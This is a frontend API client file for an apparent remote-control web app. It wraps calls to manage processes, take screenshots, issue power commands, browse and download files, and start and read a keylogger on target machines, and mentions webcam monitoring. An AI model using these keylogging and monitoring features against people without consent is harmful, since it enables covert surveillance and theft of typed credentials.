// web-app/frontend/src/services/api.js
import axios from 'axios';

const BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000';

const apiClient = axios.create({
  baseURL: BASE_URL,
  headers: {
    'Content-Type': 'application/json',
  },
});

apiClient.interceptors.request.use((config) => {
  const token = localStorage.getItem('access_token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
}, (error) => Promise.reject(error));

export const moduleService = {
  // --- 💻 QUẢN LÝ TIẾN TRÌNH & ỨNG DỤNG ---
  getApplications: (machineId) => apiClient.get(`/api/modules/applications/${machineId}`),
  startApplication: (machineId, appName) => apiClient.post(`/api/modules/applications/start`, { machine_id: machineId, app_name: appName }),
  stopApplication: (machineId, appName) => apiClient.post(`/api/modules/applications/stop`, { machine_id: machineId, app_name: appName }),
  
  getProcesses: (machineId) => apiClient.get(`/api/modules/processes/${machineId}`),
  killProcess: (machineId, pid) => apiClient.post(`/api/modules/processes/kill`, { machine_id: machineId, pid: pid }),

  // --- 📸 MÀN HÌNH & NGUỒN ---
  takeScreenshot: (machineId) => apiClient.post(`/api/modules/screenshot`, { machine_id: machineId }),
  executePowerCommand: (machineId, action) => apiClient.post(`/api/modules/power`, { machine_id: machineId, action: action }),

  // ⚠️ GHI CHÚ QUAN TRỌNG: 
  // Các module "Live Screen" và "Webcam Monitor" sử dụng kết nối WebSocket (ws://)
  // được khởi tạo trực tiếp bên trong Component, nên KHÔNG cần khai báo API REST HTTP ở đây.

  // --- 📁 QUẢN LÝ TẬP TIN ---
  browseFiles: (machineId, targetPath) => 
    apiClient.post('/api/modules/file/browse', { machine_id: machineId, target_path: targetPath }),
  downloadFile: (machineId, filePath) => 
    apiClient.post('/api/modules/file/download', { machine_id: machineId, file_path: filePath, action: "download" }),

  // --- ⌨️ NHẬT KÝ BÀN PHÍM ---
  startKeylogger: (machineId) => apiClient.post('/api/modules/keylogger/start', { machine_id: machineId }),
  stopKeylogger: (machineId) => apiClient.post('/api/modules/keylogger/stop', { machine_id: machineId }),
  getKeyloggerLogs: (machineId) => apiClient.get(`/api/modules/keylogger/${machineId}`),
};